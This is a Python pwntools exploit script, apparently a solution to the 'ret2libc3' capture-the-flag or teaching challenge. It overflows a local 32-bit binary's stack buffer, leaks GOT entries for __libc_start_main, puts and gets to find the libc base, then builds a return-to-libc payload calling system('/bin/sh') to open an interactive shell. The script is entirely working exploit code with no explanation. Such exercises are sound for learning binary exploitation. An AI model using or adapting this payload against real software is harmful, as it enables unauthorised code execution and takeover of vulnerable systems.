from pwn import *

context.log_level = 'debug'
# context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def p():
    gdb.attach(proc.pidof(io)[0])

io = process('./ret2libc3')
elf = ELF('./ret2libc3')
libc = ELF('./libc.so.6')

puts_plt = elf.plt['puts']
print(hex(puts_plt))
addr_start = 0x80484d0
libc_start_got = elf.got['__libc_start_main']
print(hex(libc_start_got))
puts_got = elf.got['puts']
gets_got = elf.got['gets']
# p()
payload = b'a'*112 + p32(puts_plt) + p32(addr_start) + p32(libc_start_got)
# io.recv()
io.sendline(payload)
libc_start_addr = u32(io.recv(4))
success("__libc_start_addr is:" + hex(libc_start_addr))
# p()
payload = b'a'*112 + p32(puts_plt) + p32(addr_start) + p32(puts_got)
# io.recv()
io.sendline(payload)
puts_addr = u32(io.recv(4))
success("puts_addr is:" + hex(puts_addr))

payload = b'a'*112 + p32(puts_plt) + p32(addr_start) + p32(gets_got)
# io.recv()
io.sendline(payload)
gets_addr = u32(io.recv(4))
success("gets_addr is:" + hex(gets_addr))

libc_start = libc.sym['__libc_start_main']
print(hex(libc_start))
libc_system = libc.sym['system']
print(hex(libc_system))
libc_binsh = 0x1b5fc8
print(hex(libc_binsh))
# print(libc.sym)

libcbase = libc_start_addr - libc_start
print(hex(libcbase))
system_addr = libcbase + libc_system
print(hex(system_addr))
binsh_addr = libcbase + libc_binsh
print(hex(binsh_addr))
# p()
payload = b'a'*104  + p32(system_addr) + 4 * b'b' + p32(binsh_addr)
io.sendline(payload)
io.interactive()
